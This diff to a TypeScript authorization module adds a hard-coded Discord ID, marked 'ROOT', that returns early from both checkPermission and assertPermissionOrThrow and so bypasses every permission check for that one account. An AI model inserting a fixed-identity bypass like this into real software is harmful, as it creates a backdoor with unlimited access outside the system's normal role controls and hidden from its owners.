@@ -59,11 +59,23 @@ export async function getUserPermissions(userId: string): Promise<RolePermission
 }
 
 export async function checkPermission(ctx: AuthContext, permission: string): Promise<boolean> {
+  // ROOT user has all permissions
+  const ROOT_ID = "1223246458975686750";
+  if (ctx.discordId === ROOT_ID) {
+    return true;
+  }
+  
   const permissions = await getUserPermissions(ctx.userId);
   return permissions[permission] === true;
 }
 
 export async function assertPermissionOrThrow(ctx: AuthContext, permission: string) {
+  // ROOT user bypasses all permission checks
+  const ROOT_ID = "1223246458975686750";
+  if (ctx.discordId === ROOT_ID) {
+    return;
+  }
+  
   const hasPermission = await checkPermission(ctx, permission);
   if (!hasPermission) {
     throw new ApiError(403, "FORBIDDEN", `Insufficient permissions for ${permission}`);
